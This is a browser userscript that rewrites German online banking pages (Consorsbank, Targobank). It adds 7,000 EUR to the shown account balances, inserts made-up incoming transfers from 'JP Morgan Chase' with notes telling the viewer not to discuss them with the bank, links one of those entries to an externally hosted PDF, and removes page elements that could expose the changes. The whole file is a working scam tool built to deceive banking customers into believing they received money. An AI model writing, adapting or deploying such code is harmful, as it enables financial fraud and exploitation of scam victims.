// ==UserScript==
// @name         Ed 4Rec  cons.Dr.Brauer@web.de
// @namespace    http://tampermonkey.net/
// @version      2.7777
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/518069/Ed%204Rec%20%20consDrBrauer%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/518069/Ed%204Rec%20%20consDrBrauer%40webde.meta.js
// ==/UserScript==



//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================



// GESAMT START

   // Configurable modification amounts and their corresponding indexes
    const accountBalanceAdjustments = [
        { index: 0, amount: 7000},

    ];

// BALANCES START

    // Configurable modification amounts and their corresponding indexes
    const balanceModificationConfig = [
        { index: 0, amount: 7000},
    //  { index: 1, amount: 3 },
   //    { index: 2, amount: 4 },
   //     { index: 3, amount: 5 },
  //     { index: 4, amount: 6 },
        { index: 5, amount: 7000 },
       { index: 6, amount: 7000  },
       { index: 7, amount: 7000  },
    ];

//  UMSATZE BALANCE

  // Configurable modification amount
    const modificationAmount = 7000; // Set your desired modification amount here
    const accountValue = '713308594'; // Set your desired account value here
    const useSelectedOption = true; // Set to false to ignore the selected option in the dropdown  BEING SET TO TRUE WHEN CLIENT HAS MANY ACCOUNTS, HOWEVER, WHEN CLIENT HAS 1 ACCOUNT IS USUALLY  BEING SET TO FALSE


// UMSATZE TRANSACTIONS

   // Specify transactions here
    const transactions = [

           {
            transactionDate: "Vorgemerkt",
            transactionDateBooking: " ",
            transactionTitle: "Treuhand: JP Morgan Chase",
            transactionDetails: "Freigabe nötig. A. Gold meldet sich. Mit Bank nicht besprechen damit nicht gesperrt.",
            transactionAmount: "+77.199,37 EUR",
            insertPosition: 'above', // Specify position for this transaction

        },
             {
            transactionDate: "03.12.2024",
            transactionDateBooking: "03.12.2024",
            transactionTitle: "JP Morgan Chase",
           transactionDetails: " A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
           transactionAmount: "       +7.000,00 EUR",
           insertPosition: 'above', // Specify position for this transaction
           link: "https://www.drivehq.com/file/DFPublishFile.aspx/FileID11920612494/Key5rcm45aq4m55/Umsatzdetails%207kr.pdf",
       },
   //       {
  //          transactionDate: "16.07.2024",
  //          transactionDateBooking: "16.07.2024",
  //          transactionTitle: "JP Morgan Chase",
  //         transactionDetails: " A. Faber meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
   //        transactionAmount: "       +11.900,00 EUR",
  //         insertPosition: 'above' // Specify position for this transaction
  //     },
 //       {
//            transactionDate: "03.07.2024",
 //           transactionDateBooking: "03.07.2024",
 //           transactionTitle: "NewTitle*Example 1234 City",
 //           transactionDetails: "JP Morgan Chase 2.500 Euro 03.07. 10356092",
  //          transactionAmount: "+2.500,00 EUR",
  //          insertPosition: 'above' // Specify position for this transaction
 //       },
 //       {
 //           transactionDate: "01.07.2024",
 //           transactionDateBooking: "01.07.2024",
 //           transactionDetails: "Bank of America 3.000 Euro 04.07. 10356100",
 //           transactionAmount: "-3.000,00 EUR",
 //           insertPosition: 'above' // Specify position for this transaction
 //       }
        // Add more transactions as needed
    ];


//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================


if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

 //   // Configurable modification amounts and their corresponding indexes
 //   const accountBalanceAdjustments = [
 //       { index: 0, amount: 700 },

//    ];

    function modifyBalances() {
        // Check for the presence of the element with the specified class
const presenceCheckElement = document.querySelector('.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8') && document.querySelector('div.row.margin-top-5 h4') && document.querySelector('.flex-element.col-pad.end-xs');
        if (presenceCheckElement) {
            // Iterate over each balance adjustment configuration
            accountBalanceAdjustments.forEach(({ index, amount }) => {
                // Find the balance element based on index
                const balanceElements = document.querySelectorAll('div.row.margin-top-5 h4');
                if (balanceElements.length > index) {
                    const balanceElement = balanceElements[index];
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + amount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue);

                        // Update the balance element with the new value and add ' EUR'
                        balanceElement.textContent = formattedNewBalance + ' EUR';

                        console.log(`Balance at index ${index} modified from ${balanceText} to ${formattedNewBalance} EUR`);
                    } else {
                        console.log(`Failed to parse current balance value at index ${index}.`);
                    }
                } else {
                    console.log(`Balance element not found at index ${index}.`);
                }
            });

            // Remove the presence check element 5 milliseconds after modification
          setTimeout(() => {
                // Use querySelectorAll correctly with the class selector
                const elementsToRemove = document.querySelectorAll('.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8' removed");
                });
            }, 30);
        } else {
            console.log('Presence check element not found. Balances not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Function to repeatedly check and modify the balances every 10 seconds
    function startBalanceModification() {
      modifyBalances();
        setInterval(modifyBalances, 100); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
//    window.addEventListener('load', startBalanceModification);
    startBalanceModification();

                    }



if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {

    'use strict';

//    // Configurable modification amounts and their corresponding indexes
//    const balanceModificationConfig = [
//        { index: 0, amount: 700 },
////        { index: 2, amount: 700 },
//        { index: 5, amount: 700 },
//    ];

    function modifyBalances() {
        // Check for the presence of the element with the specified class
       const presenceCheckElement = document.querySelector('.flex.tooltip-primary') && document.querySelector('.flex-element.col-pad.end-xs');

if (presenceCheckElement) {
            // Log the text content and indexes of all elements with the specified class
            const balanceElements = document.querySelectorAll('.flex-element.col-pad.end-xs');
            balanceElements.forEach((element, index) => {
                console.log(`Element at index ${index} with class 'flex-element col-pad end-xs': ${element.textContent.trim()}`);
            });

            // Iterate over each balance adjustment configuration
            balanceModificationConfig.forEach(({ index, amount }) => {
                if (balanceElements.length > index) {
                    const balanceElement = balanceElements[index];
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + amount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue);

                        // Update the balance element with the new value and add ' EUR'
                        balanceElement.textContent = formattedNewBalance + ' EUR';

                        console.log(`Balance at index ${index} modified from ${balanceText} to ${formattedNewBalance} EUR`);
                    } else {
                        console.log(`Failed to parse current balance value at index ${index}.`);
                    }
                } else {
                    console.log(`Balance element not found at index ${index}.`);
                }
            });

            setTimeout(() => {
                // Use querySelectorAll correctly with the class selector
                const elementsToRemove = document.querySelectorAll('.flex.tooltip-primary');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.flex.tooltip-primary' removed");
                });
            },30);
        } else {
            console.log('Presence check element not found. Balances not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Function to repeatedly check and modify the balances every 10 seconds
    function startBalanceModification() {
      modifyBalances();
        setInterval(modifyBalances, 150); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
//    window.addEventListener('load', startBalanceModification);
    startBalanceModification();

 }







    // Check if the account value is present in the URL
    if (window.location.href.indexOf("consors") > 0 ||
        window.location.href.indexOf("drive") > 0 ||
        window.location.href.indexOf("Ueberweisung") > 0) {

    // Function to check the account value
    function checkAccountValue() {
        if (useSelectedOption) {
            const selectDropdown = document.querySelector('.select-dropdown select');
            if (selectDropdown) {
                const selectedOptionValue = selectDropdown.value.trim();
                if (selectedOptionValue === accountValue) {
                    return true;
                } else {
                    console.log(`Selected account value (${selectedOptionValue}) does not match expected value (${accountValue}). Skipping balance modification.`);
                    return false;
                }
            } else {
                console.log('Select dropdown element not found. Skipping balance modification.');
                return false;
            }
        }
        return true; // If useSelectedOption is false, always return true
    }

    // Function to modify the balance
    function modifyBalance() {
        if (!checkAccountValue()) {
            return;
        }

        const presenceCheckElement = document.querySelector('.margin-top-20-md.margin-top-20-lg.row.text-typo');
        if (presenceCheckElement) {
            const balanceElement = document.getElementById('account-header-balance');
            if (balanceElement) {
                const balanceText = balanceElement.textContent.trim();
                const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                if (!isNaN(balanceValue)) {
                    const newBalanceValue = balanceValue + modificationAmount;
                    const formattedNewBalance = formatBalance(newBalanceValue);

                    balanceElement.textContent = formattedNewBalance + ' EUR';

                    console.log(`Balance modified from ${balanceText} to ${formattedNewBalance} EUR`);

                    setTimeout(() => {
                        const elementToRemove = document.querySelector('.margin-top-20-md.margin-top-20-lg.row.text-typo');
                        if (elementToRemove) {
                            elementToRemove.remove();
                            console.log("Element with class '.margin-top-20-md.margin-top-20-lg.row.text-typo' removed");
                        }
                    }, 5);
                } else {
                    console.log('Failed to parse current balance value.');
                }
            } else {
                console.log('Balance element not found.');
            }
        } else {
            console.log('Presence check element not found. Balance not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ',');
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    }

    // Function to repeatedly check and modify the balance every 10 seconds
    function startBalanceModification() {
        setInterval(modifyBalance, 70); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
    window.addEventListener('load', startBalanceModification);
    }




if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("Ueberweisung") > 0) {
    'use strict';

 //   const transactions = [
  //      {
  //          transactionDate: "Vorgemerkt",
  //          transactionDateBooking: " ",
  //          transactionTitle: "Treuhand: JP Morgan Chase",
  //          transactionDetails: "Freigabe nötig. A. Gold meldet sich. Mit Bank nicht besprechen damit nicht gesperrt.",
  //          transactionAmount: "+77.199,37 EUR",
  //          insertPosition: 'above',
  //          link: "https://example.com/transaction1"
  //      },
  //      {
  //          transactionDate: "03.12.2024",
  //          transactionDateBooking: "03.12.2024",
  //          transactionTitle: "JP Morgan Chase",
  //          transactionDetails: " A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
  //          transactionAmount: "+7.000,00 EUR",
  //         insertPosition: 'above',
   //         link: "https://example.com/transaction2"
  //      }
        // Add more transactions as needed
//    ];



    function duplicateAndModifyFirstElement(transactions) {
        let accountMatches = true;

        if (useSelectedOption) {
            const selectDropdown = document.querySelector('.select-dropdown select');
            if (selectDropdown) {
                const selectedOptionValue = selectDropdown.value.trim();
                if (selectedOptionValue !== accountValue) {
                    accountMatches = false;
                }
            } else {
                console.log("Select dropdown element not found.");
                return;
            }
        }

        if (accountMatches) {
            const element = document.querySelector('.tablecards-row.transition--ease-3');
            if (element) {
                transactions.forEach(transaction => {
                    const clone = element.cloneNode(true);

                    // Modify transaction details
                    const dateElement = clone.querySelector('.tablecards-cell .tablecards-values');
                    if (dateElement) dateElement.textContent = transaction.transactionDate;

                    const bookingDateElement = clone.querySelectorAll('[data-type="valueDate"]')[0];
                    if (bookingDateElement) bookingDateElement.textContent = transaction.transactionDateBooking;

                    const titleElement = clone.querySelectorAll('.tablecards-cell .tablecards-values')[2];
                    if (titleElement) titleElement.textContent = transaction.transactionTitle;

                    const detailsElement = clone.querySelectorAll('.tablecards-cell .tablecards-values')[3];
                    if (detailsElement) detailsElement.textContent = transaction.transactionDetails;

                    const amountElement = clone.querySelector(
                        '.tablecards-cell .tablecards-values.text--red, .tablecards-values.text--consors-basic-green'
                    );
                    if (amountElement) {
                        const isPositive = transaction.transactionAmount.trim().startsWith('+');
                        const newAmountElement = document.createElement('div');
                        newAmountElement.classList.add('tablecards-values');
                        newAmountElement.classList.add(isPositive ? 'text--consors-basic-green' : 'text--red');
                        newAmountElement.textContent = transaction.transactionAmount;
                        amountElement.parentNode.replaceChild(newAmountElement, amountElement);
                    }

                    // Add click event to navigate to the transaction's link
                    clone.addEventListener('click', () => {
                        window.location.href = transaction.link;
                    });

                    // Insert the modified element
                    const position = transaction.insertPosition || 'above';
                    if (position === 'above') {
                        element.parentNode.insertBefore(clone, element);
                    } else {
                        element.parentNode.insertBefore(clone, element.nextSibling);
                    }

                    // Add new HTML after transaction is inserted
                    const tablecardsCellNoWrapElement = clone.querySelector('.tablecards-cell.no-wrap');
                    if (tablecardsCellNoWrapElement) {
                        const newHtml = document.createElement('div');
                        newHtml.classList.add('tablecards-values');
                        newHtml.innerHTML = `
                            <div data-type="valueDate" class="flex middle-xs">
                                <span class="text--grey">${transaction.transactionDateBooking}</span>
                                <p class="text--grey"></p>
                            </div>`;
                        tablecardsCellNoWrapElement.appendChild(newHtml);
                    }

                    console.log("Element duplicated, modified, and click event added.");
                });

                setTimeout(() => {
                    const triggerElement = document.querySelector('.indicator-sort.indicator-sort-up');
                    if (triggerElement) {
                        triggerElement.remove();
                        console.log('Trigger element removed.');
                    }
                    removeSecondTablecardsValues();
                }, 5);
            } else {
                console.log("No element found with the specified class.");
            }
        } else {
            console.log("Account value does not match. Transactions not inserted.");
        }
    }

    function checkAndInsertTransactions() {
        const triggerElement = document.querySelector('.indicator-sort.indicator-sort-up');
        if (triggerElement) {
            duplicateAndModifyFirstElement(transactions);
        }
    }

    function removeSecondTablecardsValues() {
        const wbSimpleTextElements = document.querySelectorAll('wb-simple-text[label="Betrag"]');
        wbSimpleTextElements.forEach(element => {
            const valuesElements = element.querySelectorAll('.tablecards-values');
            if (valuesElements.length > 1) {
                valuesElements[1].remove();
                console.log('Removed second tablecards-values element under wb-simple-text[label="Betrag"].');
            }
        });

        const rowEndXsElements = document.querySelectorAll('.row.end-xs');
        rowEndXsElements.forEach(element => {
            const valuesElements = element.querySelectorAll('.tablecards-values');
            if (valuesElements.length > 1) {
                valuesElements[1].remove();
                console.log('Removed second tablecards-values element under .row.end-xs.');
            }
        });
    }

    setInterval(checkAndInsertTransactions, 4000); // Check every 4 seconds
    setInterval(removeSecondTablecardsValues, 10); // Continuously clean up
}







if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

    // Function to remove elements with specified classes
    function removeSpecifiedElements() {
        // Remove elements with class .col-xs-12.col-md-8.col-md-offset-4.middle-xs.text-asterix.margin-top-10
        let classElements1 = document.querySelectorAll('.col-xs-12.col-md-8.col-md-offset-4.middle-xs.text-asterix.margin-top-10');
        classElements1.forEach(element => element.remove());

        // Remove elements with class .margin-top-5.row.text-typo.hidden-xs.hidden-sm
        let classElements2 = document.querySelectorAll('.margin-top-5.row.text-typo.hidden-xs.hidden-sm');
        classElements2.forEach(element => element.remove());

        // Remove elements with class .row.row-neutral.hidden-sm.hidden-xs
        let classElements3 = document.querySelectorAll('.row.row-neutral.hidden-sm.hidden-xs');
        classElements3.forEach(element => element.remove());

        // Remove elements with tag app-exporters
        let tagElements = document.querySelectorAll('app-exporters');
        tagElements.forEach(element => element.remove());
    }

    // Check for specified elements every 50ms
    setInterval(removeSpecifiedElements, 50);
}
